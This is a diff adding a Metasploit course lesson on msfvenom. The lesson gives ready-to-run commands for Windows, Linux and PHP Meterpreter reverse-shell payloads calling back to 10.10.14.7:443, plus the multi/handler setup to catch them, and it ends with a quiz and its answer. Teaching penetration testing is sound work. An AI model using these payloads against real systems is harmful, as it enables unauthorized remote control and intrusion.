@@ -1,0 +1,86 @@
+---
+title: Payloads with msfvenom
+module: metasploit
+moduleTitle: The Metasploit Framework
+moduleOrder: 17
+moduleIcon: Zap
+order: 4
+summary: Build a standalone payload in any format, and get honest about what encoders actually do.
+estimatedMinutes: 16
+objectives:
+  - Generate reverse-shell payloads for different targets and formats
+  - Pick staged versus stageless and know why it matters
+  - Set up the matching handler to catch the callback
+tags:
+  - metasploit
+  - msfvenom
+  - payloads
+---
+
+Sometimes the exploit is not a Metasploit module. You have a file-upload form, a writable share, or a command-injection bug, and you just need a payload you can drop and trigger yourself. `msfvenom` is the standalone generator that builds that payload as a `.exe`, `.elf`, a raw PHP snippet, or twenty other formats. It is the same payload engine behind the framework, exposed as a command-line tool.
+
+The anatomy of every command is the same: pick a payload, set LHOST and LPORT, pick a format, write it to a file. Learn that skeleton and every variant is a small change.
+
+<CommandBlock
+  title="attacker@kali"
+  commands={[
+    { cmd: "msfvenom -l payloads | grep meterpreter", comment: "list available payloads, filtered" },
+    { cmd: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=443 -f exe -o shell.exe", comment: "a Windows exe" },
+    { cmd: "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=443 -f elf -o shell.elf", comment: "a Linux binary" },
+    { cmd: "msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.7 LPORT=443 -f raw -o shell.php", comment: "a PHP payload for a web upload" },
+  ]}
+/>
+
+`-p` is the payload, `-f` is the output format, `-o` is the file. The format has to match how you'll deliver it. A `.php` shell needs a server that runs PHP; an `.exe` needs the victim to execute it; raw shellcode with `-f raw` is what you paste into a buffer-overflow exploit.
+
+## Staged versus stageless
+
+Notice the difference between `windows/x64/meterpreter/reverse_tcp` and `windows/x64/meterpreter_reverse_tcp`. The slash before `reverse_tcp` makes it **staged**: a tiny first-stage stub connects back and pulls the real payload from your handler over the network. The underscore version is **stageless**: the whole payload ships in the file at once.
+
+Staged payloads are smaller on disk, which helps when you're squeezing bytes into a tight exploit. Stageless payloads are bigger but more reliable, because there's no second network round-trip that can fail. On a flaky VPN or through a picky proxy, reach for stageless. When file size is the constraint, go staged.
+
+## Catch the callback
+
+A payload with nothing listening on the other end is useless. Whatever LHOST and LPORT you baked in, you need a handler bound to the same values before you trigger the file. The generic `multi/handler` exploit is that catcher.
+
+<CommandBlock
+  title="msf6"
+  commands={[
+    { cmd: "use exploit/multi/handler", comment: "the universal payload catcher" },
+    { cmd: "set PAYLOAD windows/x64/meterpreter/reverse_tcp", comment: "must EXACTLY match the payload you generated" },
+    { cmd: "set LHOST 10.10.14.7", comment: "same as msfvenom" },
+    { cmd: "set LPORT 443", comment: "same as msfvenom" },
+    { cmd: "run -j", comment: "-j runs it as a background job so the console stays free" },
+  ]}
+/>
+
+The single most common msfvenom mistake is a handler that doesn't match the payload. If you generated a staged `reverse_tcp` but set the handler to a stageless `meterpreter_reverse_tcp`, the session dies on arrival. The PAYLOAD, LHOST, and LPORT on the handler must be byte-for-byte what you fed msfvenom.
+
+## The encoder reality check
+
+You'll read old tutorials that say `-e x86/shikata_ga_nai -i 10` makes your payload undetectable. It does not, and it never really did. Modern antivirus and EDR match behavior and known msfvenom stubs, not just static byte patterns, so a shikata-encoded Meterpreter is one of the most-flagged files on the internet. Encoders exist to solve a different, narrower problem.
+
+Their real job is removing bad characters. If your delivery path chokes on a null byte or a `0x0a`, `-b '\x00\x0a'` tells msfvenom to encode around those bytes so the payload survives transit. That is a legitimate, everyday use. Evasion is not.
+
+<Callout type="info" title="Bad-char removal, not evasion">
+Use `-b` to strip characters your exploit can't carry, like `msfvenom -p ... -b '\x00' -f raw`. Do not expect `-e` or `-i` iterations to beat antivirus; against a defended Windows host in 2026, a stock msfvenom exe gets caught. Real evasion is a separate discipline built on custom loaders, not encoder passes.
+</Callout>
+
+<Callout type="security" title="Authorized targets only">
+A payload you generate is live malware. Store it in a scoped lab directory, never email or upload it anywhere outside your engagement, and only run it against systems you own or are contracted to test. Generating a payload is legal; planting it on a machine you don't have permission for is not.
+</Callout>
+
+<Quiz
+  id="msfvenom-handler-match"
+  question="You generated windows/x64/meterpreter/reverse_tcp with msfvenom. Which handler PAYLOAD value will actually catch it?"
+  answer={2}
+  options={[
+    "windows/x64/meterpreter_reverse_tcp",
+    "windows/x64/shell/reverse_tcp",
+    "windows/x64/meterpreter/reverse_tcp",
+    "any handler works, only LPORT matters",
+  ]}
+  explanation="The handler's PAYLOAD must match exactly. A staged /reverse_tcp needs a staged handler; the stageless underscore version or a different payload will fail to complete the session."
+/>
+
+<Notes />
